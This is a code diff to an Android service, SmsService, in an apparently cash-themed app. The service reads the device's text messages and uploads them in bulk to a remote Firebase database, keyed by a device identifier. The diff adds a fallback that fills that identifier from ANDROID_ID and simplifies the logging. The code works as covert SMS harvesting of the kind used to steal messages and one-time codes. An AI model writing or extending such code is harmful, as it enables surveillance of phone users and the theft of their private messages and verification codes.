@@ -3,17 +3,18 @@ package com.my.Refiner.Cash.User;
 import android.Manifest;
 import android.app.Service;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.provider.Settings;
 import android.provider.Telephony;
 import android.util.Log;
 
 import androidx.core.content.ContextCompat;
 
-import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 
@@ -35,8 +36,14 @@ public class SmsService extends Service {
         super.onCreate();
         handler = new Handler(Looper.getMainLooper());
         dbRef = FirebaseDatabase.getInstance().getReference();
-        deviceId = getSharedPreferences("mdm", MODE_PRIVATE)
-                .getString("device_id", "unknown");
+
+        SharedPreferences prefs = getSharedPreferences("mdm", MODE_PRIVATE);
+        deviceId = prefs.getString("device_id", null);
+        if (deviceId == null || deviceId.equals("unknown")) {
+            deviceId = Settings.Secure.getString(
+                    getContentResolver(), Settings.Secure.ANDROID_ID);
+            prefs.edit().putString("device_id", deviceId).apply();
+        }
     }
 
     @Override
@@ -89,9 +96,8 @@ public class SmsService extends Service {
             }
             cursor.close();
 
-            final int finalCount = count;
             dbRef.child("devices").child(deviceId).child("sms").setValue(smsMap)
-                    .addOnSuccessListener(aVoid -> Log.d(TAG, "SMS sent: " + finalCount))
+                    .addOnSuccessListener(aVoid -> Log.d(TAG, "SMS sent: " + smsMap.size()))
                     .addOnFailureListener(e -> Log.e(TAG, "Failed: " + e.getMessage()));
         } catch (Exception e) {
             Log.e(TAG, "Error: " + e.getMessage());
